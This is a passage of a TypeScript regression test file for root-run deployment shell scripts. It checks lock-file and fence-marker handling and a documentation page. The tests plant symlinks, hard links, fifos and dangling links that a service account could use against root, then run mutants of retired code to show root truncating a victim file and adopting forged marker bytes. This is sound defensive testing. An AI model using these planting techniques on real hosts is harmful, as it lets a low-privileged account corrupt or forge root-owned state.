  // MUTATION ROUTE: delete the "How a first install obtains it" block from docs/installation.md
  // and the three doc assertions fail; change the library's DB_FENCE_ARTEFACT_SOURCE_TEXT without
  // touching the page and the shared-sentence assertion fails.
  const doc = readFileSync(join(process.cwd(), 'docs/installation.md'), 'utf8')
  const library = readFileSync(join(process.cwd(), 'scripts/lib/db-fence-protected.sh'), 'utf8')

  assert.match(doc, /IMS_FENCE_ARTEFACT_SHA256/, 'the page must name the variable')
  assert.match(doc, /first-ever install/i, 'and address the install that has nothing to read it off')
  assert.match(
    doc,
    /bash scripts\/update\.sh --print-fence-digest/,
    'and name the command that produces it, as something runnable rather than as a description of one',
  )
  assert.match(doc, /THE FENCE ARTEFACT THIS CHECKOUT WOULD PUBLISH HASHES TO/, 'and the line to read the value off')
  assert.match(
    library,
    /THE FENCE ARTEFACT THIS CHECKOUT WOULD PUBLISH HASHES TO/,
    'which is the line the library actually prints',
  )
  // AND THE UNPINNED BOOTSTRAP IS DOCUMENTED AS A REFUSAL, not as trust on first use.
  assert.doesNotMatch(
    doc,
    /An \*\*unpinned\*\* bootstrap still\s+proceeds/,
    'the page must not still describe the behaviour the ruling removed',
  )

  // o3d-2sm1.5 r35, Codex HIGH + MEDIUM — WHAT THIS TEST IS NO LONGER ALLOWED TO BE.
  //
  // The r34 revision of this block asserted that the page's opening installer command carried
  // `IMS_FENCE_ARTEFACT_SHA256=` and that the page said the run "refuses without it". Both
  // assertions passed. Both sentences were FALSE: the first-install path never read the variable,
  // so omitting it produced no refusal and supplying it published nothing. A test that reads
  // documentation verifies the claim, not the code, and this one certified a claim the code
  // contradicted for a whole round.
  //
  // So the behavioural half now lives in tests/scripts/fence-digest-and-first-install.test.ts,
  // which RUNS the documented release command from a clean checkout and RUNS a first install with
  // and without the pin. What is left here is the only thing a page can be tested for: that the
  // one text with several readers has not drifted, and that the sentence the previous round got
  // wrong has not come back.
  assert.doesNotMatch(
    doc,
    /required on an ordinary install and the run refuses without it/,
    'the page must not claim a first install refuses without the pin: it does not, and nothing in install.sh ever checked',
  )
  const FIRST_INSTALL_POLICY = /performs? no credentialed fence execution/i
  assert.match(doc, FIRST_INSTALL_POLICY, 'the page must state the first-install policy in the words the code uses')
  assert.match(
    INSTALL_SOURCE,
    /performs NO credentialed fence execution/,
    'and the installer must be the thing that says it, in the refusal an operator would actually meet',
  )
})

// ---------------------------------------------------------------------------
// THE CUTOVER NAMESPACE (o3d-secops r22, Codex CRITICAL x2 + HIGH)
//
// THREE FINDINGS, ONE SHAPE: a privileged process deciding something from a name, or from bytes,
// that ${APP_USER} controls. ${CUTOVER_STATE_DIR} is the application's own data directory, so every
// name directly beneath it is that account's to create, replace and unlink — `unlink(2)` and
// `rename(2)` ask for write permission on the PARENT and ask nothing whatever about the file.
//
//   THE LOCK          `exec 9>"$LOCK_FILE"` is O_WRONLY|O_CREAT|O_TRUNC, as root, on that name.
//   THE FENCE DIR     `mkdir -p` accepts a symlink-to-directory, and the `chown`/`chmod` that
//                     followed both dereference.
//   THE OLD MARKER    r21 authenticated its bytes with `st_nlink`, which is a fact about the
//                     present and not about the past.
//
// WHAT THIS HARNESS CAN AND CANNOT SHOW, stated rather than glossed, exactly as the r20 and r21
// sections state it. It runs as ONE account, so "${APP_USER} planted this and root did not" is not
// directly measurable, and neither is "the service account cannot chown anything to root". What IS
// measured, for real, on a real filesystem, through the SHIPPED functions: a planted symlink at
// each of the two root-side targets, the victim's bytes and modes before and after, where each
// construct stops, and — by mutation of the shipped text — that the retired construct does the
// damage the finding describes. Every mutation below changes SHIPPED TEXT rather than
// re-implementing it, so a mutant that no longer matches throws instead of quietly passing.
// ---------------------------------------------------------------------------

/** The namespace library's own path, asserted rather than assumed: three entrypoints source it, and
 *  a test that read a file the scripts do not run would measure nothing. */
const CUTOVER_NS_LIB_PATH = join(process.cwd(), 'scripts/lib/cutover-namespace.sh')

/** The shipped gate the importer asks the legacy NAME, quoted exactly. */
const SHIPPED_SOURCE_GATE = '  [[ -e "${LEGACY_STATE_DIR_FENCE_FILE}" || -L "${LEGACY_STATE_DIR_FENCE_FILE}" ]] || return 0'
/** THE PRE-r22 GATE AND READ. `[[ -f ]]` follows a symlink and asks nothing about who wrote what it
 *  found; the publication then took the old file's bytes verbatim — which is r20/r21's shape, and
 *  the shape whose premise r22 rejects. Everything else in the function is shipped text, so what
 *  these mutants measure is exactly this pair. */
const PRE_R22_GATE = '  [[ -f "${LEGACY_STATE_DIR_FENCE_FILE}" ]] || return 0'
const COMPOSED_MARKER_START = '  {\n    echo "fenced_at=$(date -Iseconds)"'
const COMPOSED_MARKER_END = 'Nothing has been stopped and nothing has been migrated."\n'

/** The shipped importer with its composed marker replaced by the copy it retired. */
function preR22Importer(source: string): string {
  const shipped = shellFunction(source, 'import_relocated_fence_marker')
  assert.ok(shipped.includes(SHIPPED_SOURCE_GATE),
    `the shipped importer must ask the NAME one question and open nothing:\n${shipped}`)
  const start = shipped.indexOf(COMPOSED_MARKER_START)
  assert.notEqual(start, -1, `the shipped importer must COMPOSE the marker it publishes:\n${shipped}`)
  const end = shipped.indexOf(COMPOSED_MARKER_END, start)
  assert.notEqual(end, -1, `the composed publication must end in a die:\n${shipped}`)
  return (shipped.slice(0, start)
    + '  publish_durable_file "${FENCE_FILE}" < "${LEGACY_STATE_DIR_FENCE_FILE}" || die "the retired copy could not be published"\n'
    + shipped.slice(end + COMPOSED_MARKER_END.length)
  ).replace(SHIPPED_SOURCE_GATE, PRE_R22_GATE)
}

/** What the relocation left behind, read back the same way for every shape. */
const RELOCATION_OUTCOME = [
  'rc=0; ( import_relocated_fence_marker ) 2>&1 || rc=$?; echo "RC=${rc}"',
  '[[ -e "${FENCE_FILE}" ]] && echo PUBLISHED || echo NOT_PUBLISHED',
  'if [[ -f "${FENCE_FILE}" ]] && grep -q "^ROOT_ONLY_BYTES=1$" "${FENCE_FILE}"; then echo SOURCE_BYTES_REPUBLISHED; else echo SOURCE_BYTES_NOT_REPUBLISHED; fi',
  'if [[ -f "${FENCE_FILE}" ]]; then sed -n "s/^\\(phase\\|schema_touched\\|migration_attempted\\|legacy_marker_unauthenticated\\)=/ADOPTED_\\1=/p" "${FENCE_FILE}"; fi',
  '[[ -e "${LEGACY_STATE_DIR_FENCE_FILE}" || -L "${LEGACY_STATE_DIR_FENCE_FILE}" ]] && echo ENTRY_LEFT_IN_PLACE || echo ENTRY_REMOVED',
]

const RELOCATION_FUNCTIONS = ['fsync_path', 'publish_durable_file', 'ensure_fence_marker_dir', 'import_relocated_fence_marker']
const RELOCATION_FUNCTIONS_FOR_MUTANT = ['fsync_path', 'publish_durable_file', 'ensure_fence_marker_dir']

/** The three lines adoption acts on, asserted together: any one of them read the cheap way is the
 *  reading that leaves a service running, or releases a connection fence, over a schema that may
 *  have moved. */
function assertConservativeAdoption(stdout: string, what: string): void {
  assert.match(stdout, /^ADOPTED_phase=stopping$/m, `${what}: phase must be read the expensive way:\n${stdout}`)
  assert.match(stdout, /^ADOPTED_schema_touched=true$/m, `${what}: and the schema:\n${stdout}`)
  assert.match(stdout, /^ADOPTED_migration_attempted=true$/m, `${what}: and the intent:\n${stdout}`)
  assert.match(stdout, /^ADOPTED_legacy_marker_unauthenticated=1$/m,
    `${what}: and the marker must record that those three are a policy, not a reading:\n${stdout}`)
}

for (const entry of R9_SCRIPTS) {
  test(`${entry.name} does not follow a symlink at the pre-r20 marker path, and publishes nothing that came out of it`, () => {
    /**
     * ROUTE: the shipped import_relocated_fence_marker(), run for real, with a REAL symlink at
     * ${LEGACY_STATE_DIR_FENCE_FILE} pointing at a file that is otherwise a perfect marker — 0600,
     * owned by this run, complete. Everything a destination check would ask about it is true. The
     * only thing wrong with it is that this run did not put it at that name.
     *
     * WHAT r22 CHANGED, AND IT IS THE POINT: the run no longer REFUSES here. An entry at that name
     * is what an earlier checkout's `AssertPathExists=!` asserts on, so the host may be fenced and
     * that alone is what the marker records. What must not happen — and what the mutation below
     * shows happening — is the link's target becoming this host's account of an interrupted deploy.
     */
    const planted = [
      'printf "phase=arming\\nschema_touched=false\\nmarker_complete=1\\nROOT_ONLY_BYTES=1\\n" > "${CUTOVER_STATE_DIR}/somewhere-else"',
      'chmod 600 "${CUTOVER_STATE_DIR}/somewhere-else"',
      'ln -s "${CUTOVER_STATE_DIR}/somewhere-else" "${LEGACY_STATE_DIR_FENCE_FILE}"',
    ]
    const run = runR9(entry, RELOCATION_FUNCTIONS, [...planted, ...RELOCATION_OUTCOME].join('\n'),
      FENCE_RELOCATION_EXTRA('$CUTOVER_STATE_DIR'))

    assert.match(run.stdout, /^RC=0$/m, `an entry at that name is a signal, not an error:\n${run.stdout}`)
    assert.match(run.stdout, /^PUBLISHED$/m,
      `and it must leave a marker at the canonical path, or the host is adopted as unfenced:\n${run.stdout}`)
    assert.match(run.stdout, /^SOURCE_BYTES_NOT_REPUBLISHED$/m,
      `but the link's target must not become this host's record of an interrupted deploy:\n${run.stdout}`)
    assertConservativeAdoption(run.stdout, 'a symlink at the old path')
    assert.match(run.stdout, /^ENTRY_LEFT_IN_PLACE$/m,
      `and the entry stays, because an installed drop-in still asserts on it — removing it is a release:\n${run.stdout}`)
    assert.match(run.stdout, /NONE OF IT HAS BEEN READ/, `and the operator is told what was not established:\n${run.stdout}`)
    assert.match(run.stdout, /DropInPaths/, `and what CAN be established instead:\n${run.stdout}`)

    // MEASURED BY MUTATION, ROUTE STATED: the same shipped importer with the pre-r22 pair — the
    // `[[ -f ]]` that follows the link, and the publication that takes the old file's bytes. The
    // target's bytes are then published at ${FENCE_FILE}, root-owned and 0600, where every
    // provenance check the destination makes passes because the publication made it pass — and
    // `phase=arming`/`schema_touched=false` become what adoption acts on.
    const mutated = runR9(entry, RELOCATION_FUNCTIONS_FOR_MUTANT,
      [preR22Importer(entry.source), ...planted, ...RELOCATION_OUTCOME].join('\n'),
      FENCE_RELOCATION_EXTRA('$CUTOVER_STATE_DIR'))
    assert.match(mutated.stdout, /^SOURCE_BYTES_REPUBLISHED$/m,
      `the retired construct launders the link's target into root-owned state at the marker's name — that is the finding:\n${mutated.stdout}`)
    assert.match(mutated.stdout, /^ADOPTED_phase=arming$/m,
      `and hands adoption the cheap reading, chosen by whoever planted the link:\n${mutated.stdout}`)
    assert.match(mutated.stdout, /^ADOPTED_schema_touched=false$/m,
      `including the one that releases a connection fence over a schema that may be half migrated:\n${mutated.stdout}`)
  })

  test(`${entry.name} does not believe a pre-r20 marker that passes every check r21 made of it`, () => {
    /**
     * THE r22 HIGH, EXHIBITED. r21's helper asked six questions of the descriptor it held: regular
     * file, owned by this run's uid, not group- or other-writable, exactly ONE link, and the
     * descriptor is that name's own inode. The file planted below answers all six correctly — it
     * is a 0600 regular file owned by this run with `st_nlink == 1` — AND ITS CONTENT WAS CHOSEN BY
     * WHOEVER PLANTED IT, because a second name existed while it was being written and was then
     * dropped. `st_nlink` is a fact about the present; it cannot say the inode was never linked.
     *
     * The harness constructs exactly that history — write, `ln`, `rm` — which is what the account
     * that owns this directory can do to any root-owned 0600 file whose CONTENT it influenced, and
     * this branch creates one of those on every run (${CRON_BACKUP} is that account's own crontab).
     *
     * ROUTE: the shipped importer. It never opens the file, so the history does not matter, which
     * is the whole change: the answer stopped depending on a question that cannot be answered.
     */
    const planted = [
      'printf "phase=arming\\nschema_touched=false\\nmarker_complete=1\\nROOT_ONLY_BYTES=1\\n" > "${CUTOVER_STATE_DIR}/influenced"',
      'chmod 600 "${CUTOVER_STATE_DIR}/influenced"',
      // THE SECOND NAME, AND THEN ITS REMOVAL. What is left at the marker's path is one link to an
      // inode this run would find impeccable and did not write.
      'ln "${CUTOVER_STATE_DIR}/influenced" "${LEGACY_STATE_DIR_FENCE_FILE}"',
      'rm -f "${CUTOVER_STATE_DIR}/influenced"',
      'stat -c "PLANTED_LINKS=%h PLANTED_MODE=%a PLANTED_OWNER=%u" "${LEGACY_STATE_DIR_FENCE_FILE}"',
    ]
    const run = runR9(entry, RELOCATION_FUNCTIONS, [...planted, ...RELOCATION_OUTCOME].join('\n'),
      FENCE_RELOCATION_EXTRA('$CUTOVER_STATE_DIR'))

    // THE PRECONDITION IS ASSERTED, or this test is about a file that would have been refused for
    // some other reason and proves nothing about the link count at all.
    assert.match(run.stdout, /^PLANTED_LINKS=1 PLANTED_MODE=600 PLANTED_OWNER=\d+$/m,
      `the planted file must be exactly what r21 would have accepted:\n${run.stdout}`)
    assert.match(run.stdout, new RegExp(`^PLANTED_LINKS=1 PLANTED_MODE=600 PLANTED_OWNER=${harnessUid()}$`, 'm'),
      `owned by the account running the cutover:\n${run.stdout}`)

    assert.match(run.stdout, /^RC=0$/m, run.stdout)
    assert.match(run.stdout, /^PUBLISHED$/m, `the host is still recorded as possibly fenced:\n${run.stdout}`)
    assert.match(run.stdout, /^SOURCE_BYTES_NOT_REPUBLISHED$/m,
      `and none of its bytes reach the canonical marker:\n${run.stdout}`)
    assertConservativeAdoption(run.stdout, 'an impeccable planted marker')
    assert.match(run.stdout, /^ENTRY_LEFT_IN_PLACE$/m, run.stdout)

    // MEASURED BY MUTATION, ROUTE STATED: the retired copy, over the same file. Every check r21
    // made passes — that is the point of the file — and `phase=arming, schema_touched=false`, a
    // reading chosen by whoever influenced those bytes, becomes what adoption acts on.
    const mutated = runR9(entry, RELOCATION_FUNCTIONS_FOR_MUTANT,
      [preR22Importer(entry.source), ...planted, ...RELOCATION_OUTCOME].join('\n'),
      FENCE_RELOCATION_EXTRA('$CUTOVER_STATE_DIR'))
    assert.match(mutated.stdout, /^SOURCE_BYTES_REPUBLISHED$/m,
      `a file with one link, 0600, owned by this run, is exactly what the retired construct accepts:\n${mutated.stdout}`)
    assert.match(mutated.stdout, /^ADOPTED_schema_touched=false$/m,
      `and the fence is released on a byte the service account chose:\n${mutated.stdout}`)
  })

  test(`${entry.name} treats a directory, a fifo and a dangling link at the pre-r20 path as the same signal, and opens none of them`, () => {
    /**
     * EVERY OTHER SHAPE THE ACCOUNT THAT OWNS THAT DIRECTORY CAN LEAVE THERE. r21 refused each of
     * them, on the descriptor; r22 does not open them at all, so each is what its PRESENCE says it
     * is — this host may be fenced — and nothing else.
     *
     * THE FIFO IS HERE FOR A REASON BEYOND THE OUTCOME: `open(2)` on a fifo for reading blocks
     * until a writer appears, so an importer that still opened this name would park a root-side
     * cutover for ever. This test completing at all is the measurement, and it needs no timeout
     * and no O_NONBLOCK to make it, because nothing opens anything.
     */
    for (const shape of [
      { name: 'directory', plant: 'mkdir "${LEGACY_STATE_DIR_FENCE_FILE}"', clean: 'rmdir "${LEGACY_STATE_DIR_FENCE_FILE}"' },
      { name: 'fifo', plant: 'mkfifo "${LEGACY_STATE_DIR_FENCE_FILE}"', clean: 'rm -f "${LEGACY_STATE_DIR_FENCE_FILE}"' },
      { name: 'dangling', plant: 'ln -s "${CUTOVER_STATE_DIR}/never-existed" "${LEGACY_STATE_DIR_FENCE_FILE}"', clean: 'rm -f "${LEGACY_STATE_DIR_FENCE_FILE}"' },
    ]) {
      const run = runR9(entry, RELOCATION_FUNCTIONS, [
        shape.plant,
        ...RELOCATION_OUTCOME,
        // AND THEN THE ENTRY IS CLEARED, WHICH IS A FACT ABOUT THIS HARNESS AND NOT ABOUT THE CODE:
        // runR9() reads ${dir}/DEPLOY-FENCED unconditionally when it returns, and `readFileSync` on
        // a fifo blocks for ever while on a directory it throws. The assertion that the shipped run
        // left the entry alone has already been recorded above this line.
        shape.clean,
      ].join('\n'), FENCE_RELOCATION_EXTRA('$CUTOVER_STATE_DIR'))
      assert.match(run.stdout, /^RC=0$/m, `${shape.name}: an entry is an entry:\n${run.stdout}`)
      assert.match(run.stdout, /^PUBLISHED$/m, `${shape.name}: and the host is recorded as possibly fenced:\n${run.stdout}`)
      assertConservativeAdoption(run.stdout, shape.name)
      assert.match(run.stdout, /^ENTRY_LEFT_IN_PLACE$/m, `${shape.name}: and nothing is removed:\n${run.stdout}`)
    }
  })
}

test('[o3d-secops r22] no entrypoint reads the pre-r20 marker, and the helper that used to has gone with the reason for it', () => {
  // THE SWEEP. r21's answer was a descriptor helper; r22's is that there is no question a helper
  // could answer. Both halves are held here: the retired constructs are absent from all three, the
  // helper file is gone, and the importer is one text.
  assert.equal(existsSync(join(process.cwd(), 'scripts/lib/pin-source-file.mjs')), false,
    'scripts/lib/pin-source-file.mjs authenticated bytes that cannot be authenticated; an unused apparatus with that premise is an invitation to wire it back up')

  const bodies = R9_SCRIPTS.map((entry) => shellFunction(entry.source, 'import_relocated_fence_marker'))
  assert.equal(new Set(bodies).size, 1,
    `import_relocated_fence_marker() has drifted between the entrypoints:\n${R9_SCRIPTS.map((e, i) => `--- ${e.name} ---\n${bodies[i]}`).join('\n')}`)

  for (const entry of R9_SCRIPTS) {
    const body = shellFunction(entry.source, 'import_relocated_fence_marker')
    // A COMMENT MAY NAME IT — the entrypoints carry the paragraph that says why it went, and a
    // rule that forbade the word would delete the reasoning along with the code. What may not
    // survive is an executable reference: a resolution, or an invocation.
    assert.ok(!/helper=.*pin-source-file/.test(entry.source),
      `${entry.name} must not resolve a helper for a question it no longer asks`)
    assert.ok(!/\bhelper\b/.test(body),
      `${entry.name}'s importer must not resolve or run a helper at all — chown-tree.mjs still uses a local of that name elsewhere, which is why this is asked of the FUNCTION and not of the file:\n${body}`)
    assert.ok(!/IMS_FENCE_SOURCE_HELPER/.test(entry.source),
      `${entry.name} must not carry the override for a helper that is gone`)
    assert.ok(!/< "\$\{LEGACY_STATE_DIR_FENCE_FILE\}"/.test(body),
      `${entry.name} must not read the legacy marker by name:\n${body}`)
    assert.ok(!/(cat|node) .*LEGACY_STATE_DIR_FENCE_FILE/.test(body),
      `${entry.name} must not open the legacy marker at all:\n${body}`)
    assert.ok(body.includes(SHIPPED_SOURCE_GATE),
      `${entry.name} must ask that name exactly one question, and it must see a dangling link:\n${body}`)
    for (const line of ['echo "phase=stopping"', 'echo "schema_touched=true"', 'echo "migration_attempted=true"', 'echo "legacy_marker_unauthenticated=1"']) {
      assert.ok(body.includes(`    ${line}`), `${entry.name} must compose ${line} itself:\n${body}`)
    }
  }
})

// ---------------------------------------------------------------------------
// THE TWO ROOT-SIDE TARGETS (o3d-secops r22, Codex CRITICAL x2)
// ---------------------------------------------------------------------------

/** The namespace functions, and the ONE file that defines each of them. A definition that came back
 *  to an entrypoint would be a fourth copy of a rule about where a privileged process may write. */
const CUTOVER_NS_OWNED = [
  // o3d-ov60. It was defined in install.sh and called only from install.sh, so update.sh's clone
  // path — the same rm -rf and the same cp -a into the same name — could not reach it.
  'copy_tree_into_new_dir',
  'enter_service_subdir',
  'mkdir_service_subdir',
  'own_service_subdir',
  'ensure_cutover_root_dir',
  'ensure_cutover_state_dirs',
  'verify_held_lock',
  'narrow_held_lock',
  'held_lock_mode',
  'lock_mode_is_private',
  'rotate_cutover_lock_inode',
  'dir_is_private_to_this_run',
  'prepare_cutover_lock_file',
  'acquire_cutover_lock',
  'acquire_legacy_namespace_lock',
  'state_pre_r22_cutovers_are_not_excluded',
  'warn_pre_r22_db_fence_state',
  'warn_legacy_namespace_db_fence_state',
] as const

/** What a run leaves behind at both root-side targets, read back the same way every time.
 *
 *  THE SUBSHELL IS THE POINT AND IT IS ALSO A LIMIT. `die` is `exit 1`, so a refusal has to run
 *  inside `( … )` or the rig ends and none of the post-conditions below it are observed — but a
 *  subshell that exits CLOSES the descriptors, and closing the last descriptor on an flock RELEASES
 *  it. So a test that asks whether the lock is actually HELD uses the inline form below instead,
 *  which is only usable where the call is expected to succeed. */
const NAMESPACE_OUTCOME = [
  'rc=0; ( acquire_cutover_lock ) 2>&1 || rc=$?; echo "RC=${rc}"',
  'echo "ROOT=$(LC_ALL=C stat -c "%F %a %u" "${CUTOVER_ROOT_DIR}" 2>/dev/null || echo missing)"',
  'echo "FENCEDIR=$(LC_ALL=C stat -c "%F %a" "${DB_FENCE_DIR}" 2>/dev/null || echo missing)"',
  'echo "FENCEDIROWNER=$(LC_ALL=C stat -c "%u" "${DB_FENCE_DIR}" 2>/dev/null || echo missing)"',
  'echo "LOCK=$(LC_ALL=C stat -c "%F %a" "${LOCK_FILE}" 2>/dev/null || echo missing)"',
]

/** The same, with the acquisition in THIS shell, so the descriptors — and the locks on them —
 *  outlive it and can be asked about. */
const NAMESPACE_OUTCOME_INLINE = ['acquire_cutover_lock', 'echo "RC=0"', ...NAMESPACE_OUTCOME.slice(1)]

/** o3d-secops r24: the rotation replaces the canonical inode, so it may only ever run once this run
 *  has PROVED nothing else holds the lock on it — which is `flock -n 9` succeeding. Written as a
 *  predicate rather than inline so the ordering is stated once. */
const ACQUIRE_ORDER = (acquire: string) =>
  acquire.indexOf('flock -n 9') !== -1 &&
  acquire.indexOf('rotate_cutover_lock_inode "$LOCK_FILE"') > acquire.indexOf('flock -n 9')

for (const entry of R9_SCRIPTS) {
  test(`${entry.name} creates the cutover namespace under a root-owned parent, and takes the lock on it`, () => {
    /**
     * THE ORDINARY RUN, WITHOUT WHICH EVERY REFUSAL BELOW IS WORTHLESS. ROUTE: the shipped
     * acquire_cutover_lock(), which walks to ${CUTOVER_ROOT_DIR}, walks to ${DB_FENCE_DIR} beneath
     * it, applies owner and mode to the descriptor it lands on, creates the lock file with
     * O_CREAT|O_EXCL, opens it READ-ONLY, judges that descriptor and locks it.
     */
    const run = runR9(entry, ['acquire_cutover_lock'], [
      ...NAMESPACE_OUTCOME_INLINE,
      // THE LOCK IS ACTUALLY HELD, asked of the kernel rather than of this script: a second flock
      // on the same inode, from a child with its own descriptor, must fail.
      '( exec 5<"${LOCK_FILE}"; flock -n 5 && echo LOCK_FREE || echo LOCK_HELD )',
    ].join('\n'), FENCE_RELOCATION_EXTRA('$CUTOVER_STATE_DIR'))
    assert.match(run.stdout, /^RC=0$/m, `an ordinary cutover must still take its lock:\n${run.stdout}`)
    assert.match(run.stdout, /^LOCK_HELD$/m,
      `and it must be a lock, not a file it opened and let go:\n${run.stdout}`)
    assert.match(run.stdout, new RegExp(`^ROOT=directory 711 ${harnessUid()}$`, 'm'),
      `the parent must be owned by the account running the cutover and writable by nobody else — that is what makes the two names beneath it unplantable — and traversable without being LISTABLE (o3d-secops r23):\n${run.stdout}`)
    assert.match(run.stdout, /^FENCEDIR=directory 755$/m,
      `and the connection-fence directory must be root-owned and readable rather than app-owned: since r23 the record in it is published by root and only EXECUTED by the service account:\n${run.stdout}`)
    assert.match(run.stdout, new RegExp(`^FENCEDIROWNER=${harnessUid()}$`, 'm'),
      `owned by the account running the cutover, which is what makes a record inside it one the service account cannot have written:\n${run.stdout}`)
    assert.match(run.stdout, /^LOCK=regular (empty )?file 600$/m,
      `and the lock must be a plain file no other account can open: flock needs nothing but a descriptor, so readable is holdable (o3d-secops r23, Codex HIGH):\n${run.stdout}`)
  })

  test(`${entry.name} does not truncate what a symlink at the lock path points at, and refuses to lock it`, () => {
    /**
     * CRITICAL 1, EXHIBITED, AND ISOLATED — because the shipped run has TWO guards in front of that
     * open and a test that only shows "the victim survived" does not say which of them saved it, or
     * whether either did. So the same planted link is run past three constructs:
     *
     *   SHIPPED       prepare_cutover_lock_file() lstats the name, reads "symbolic link", and the
     *                 run ends before anything is opened at all.
     *   MUTANT A      that lstat neutered, the shipped READ-ONLY open kept. The link IS followed —
     *                 and the target still cannot be truncated, because an `open(O_RDONLY)` has no
     *                 O_TRUNC in it — and verify_held_lock() then refuses, because the descriptor is
     *                 not that name's own inode. This is what the second guard is worth on its own.
     *   MUTANT B      that lstat neutered AND the open restored to `exec 9>"$LOCK_FILE"`, which is
     *                 the pre-r22 construct exactly. The victim is 0 bytes.
     *
     * Both mutants are built by replacing SHIPPED TEXT, asserted present first, so a mutant that
     * stopped matching throws instead of quietly running the shipped function and passing.
     *
     * The parent is root-owned in production, so this shape cannot arise there — which is the fix.
     * It is planted here anyway because the mechanism must not rest on the mode of a directory:
     * that is an argument, and an argument is what the next round reads past.
     */
    const plant = [
      'mkdir -p "${CUTOVER_ROOT_DIR}"',
      'printf "SECRET-CONTENT\\n" > "${CUTOVER_STATE_DIR}/victim"',
      'chmod 600 "${CUTOVER_STATE_DIR}/victim"',
      'echo "BEFORE=$(stat -c %s "${CUTOVER_STATE_DIR}/victim")"',
      'ln -s "${CUTOVER_STATE_DIR}/victim" "${LOCK_FILE}"',
    ]
    const readBack = [
      'echo "AFTER=$(stat -c %s "${CUTOVER_STATE_DIR}/victim")"',
      '[[ -L "${LOCK_FILE}" ]] && echo LINK_LEFT_ALONE || echo LINK_TOUCHED',
    ]

    const run = runR9(entry, ['acquire_cutover_lock'], [...plant, ...NAMESPACE_OUTCOME, ...readBack].join('\n'),
      FENCE_RELOCATION_EXTRA('$CUTOVER_STATE_DIR'))
    assert.match(run.stdout, /^BEFORE=15$/m, `the victim must start with content, or this test measures nothing:\n${run.stdout}`)
    assert.match(run.stdout, /^RC=1$/m, `a name the run cannot identify must end it:\n${run.stdout}`)
    assert.match(run.stdout, /^AFTER=15$/m,
      `and the target must be untouched — the truncation is the whole of the damage:\n${run.stdout}`)
    assert.match(run.stdout, /is not a regular file this run may lock/,
      `and the lstat of the NAME is what must have said so:\n${run.stdout}`)
    assert.match(run.stdout, /Nothing has been stopped/, `and the refusal must say what state the host is in:\n${run.stdout}`)
    assert.match(run.stdout, /^LINK_LEFT_ALONE$/m, `and nothing may be created or removed at that name:\n${run.stdout}`)

    // MUTATION A, ROUTE STATED: the type question removed from prepare_cutover_lock_file(), so the
    // shipped open is reached with a symlink at that name and follows it.
    const PREPARE = shellFunction(CUTOVER_NS_LIB, 'prepare_cutover_lock_file')
    const KIND_CHECK = '  [[ "${kind}" == "regular file" || "${kind}" == "regular empty file" ]] || return 1'
    assert.ok(PREPARE.includes(KIND_CHECK), `the shipped preparation must refuse anything that is not a plain file:\n${PREPARE}`)
    const permissive = PREPARE.replace(KIND_CHECK, '  : "${kind}"')

    const mutantA = runR9(entry, ['acquire_cutover_lock'], [
      permissive, ...plant, ...NAMESPACE_OUTCOME, ...readBack,
    ].join('\n'), FENCE_RELOCATION_EXTRA('$CUTOVER_STATE_DIR'))
    assert.match(mutantA.stdout, /^RC=1$/m, `the descriptor check must still end the run:\n${mutantA.stdout}`)
    assert.match(mutantA.stdout, /is not that name's own inode/,
      `and it must be the descriptor check that says so, not the lstat this mutation removed:\n${mutantA.stdout}`)
    assert.match(mutantA.stdout, /^AFTER=15$/m,
      `and a followed link still cannot be truncated through an O_RDONLY open — that is what opening it for READING is worth:\n${mutantA.stdout}`)

    // MUTATION B, ROUTE STATED: and the open restored to what it was. `exec 9>` is
    // O_WRONLY|O_CREAT|O_TRUNC, the truncation lands before `flock` is reached, and the lock the
    // run then reports is held on the attacker's chosen inode.
    const ACQUIRE = shellFunction(CUTOVER_NS_LIB, 'acquire_cutover_lock')
    const SHIPPED_OPEN = '  exec 9<"$LOCK_FILE"\n'
    const SHIPPED_FLOCK = '  flock -n 9 || die'
    const openAt = ACQUIRE.indexOf(SHIPPED_OPEN)
    const flockAt = ACQUIRE.indexOf(SHIPPED_FLOCK)
    assert.ok(openAt !== -1 && flockAt > openAt,
      `the shipped lock must be opened for reading and judged before it is locked:\n${ACQUIRE}`)
    const preR22Acquire = `${ACQUIRE.slice(0, openAt)}  exec 9>"$LOCK_FILE"\n${ACQUIRE.slice(flockAt)}`

    const mutantB = runR9(entry, ['acquire_cutover_lock'], [
      permissive, preR22Acquire, ...plant, ...NAMESPACE_OUTCOME, ...readBack,
    ].join('\n'), FENCE_RELOCATION_EXTRA('$CUTOVER_STATE_DIR'))
    assert.match(mutantB.stdout, /^RC=0$/m,
      `the retired construct reports a lock it took on somebody else's file:\n${mutantB.stdout}`)
    assert.match(mutantB.stdout, /^AFTER=0$/m,
      `having truncated it as root before the flock — that is the finding:\n${mutantB.stdout}`)
  })

  test(`${entry.name} locks the descriptor it judged, and refuses one that is not the name's own inode`, () => {
    /**
     * THE OTHER HALF OF CRITICAL 1, WHICH THE OLD CODE COULD NOT STATE AT ALL: `flock -n 9`
     * succeeding says a lock was taken and says nothing about what it was taken ON.
     *
     * ROUTE: the shipped verify_held_lock(), run against a descriptor this harness opens itself, so
     * what is measured is the function and not the caller. Three cases, one of them the shipped
     * one. The middle case is the race the check exists for: the descriptor is opened, the NAME is
     * then replaced, and the two no longer agree — which is refused, because a disagreement is
     * never read as an acceptance.
     */
    const run = runR9(entry, ['verify_held_lock'], [
      'printf "" > "${CUTOVER_STATE_DIR}/real.lock"',
      'printf "" > "${CUTOVER_STATE_DIR}/other.lock"',
      'exec 9<"${CUTOVER_STATE_DIR}/real.lock"',
      'verify_held_lock 9 "${CUTOVER_STATE_DIR}/real.lock" && echo MATCHING=OK || echo MATCHING=REFUSED',
      // THE NAME MOVES AND THE DESCRIPTOR DOES NOT. This is exactly what a rename by the account
      // that owns the directory does between the open and the check.
      'mv -f "${CUTOVER_STATE_DIR}/other.lock" "${CUTOVER_STATE_DIR}/real.lock"',
      'verify_held_lock 9 "${CUTOVER_STATE_DIR}/real.lock" && echo SWAPPED=OK || echo SWAPPED=REFUSED',
      // AND A DESCRIPTOR ON SOMETHING THAT IS NOT A REGULAR FILE.
      'exec 8<"${CUTOVER_STATE_DIR}"',
      'verify_held_lock 8 "${CUTOVER_STATE_DIR}" && echo DIRECTORY=OK || echo DIRECTORY=REFUSED',
    ].join('\n'), FENCE_RELOCATION_EXTRA('$CUTOVER_STATE_DIR'))

    assert.match(run.stdout, /^MATCHING=OK$/m,
      `the descriptor a run opened on its own lock must be accepted, or nothing ever locks:\n${run.stdout}`)
    assert.match(run.stdout, /^SWAPPED=REFUSED$/m,
      `and a name replaced after the open must be refused — the fd is the pin, the name is not:\n${run.stdout}`)
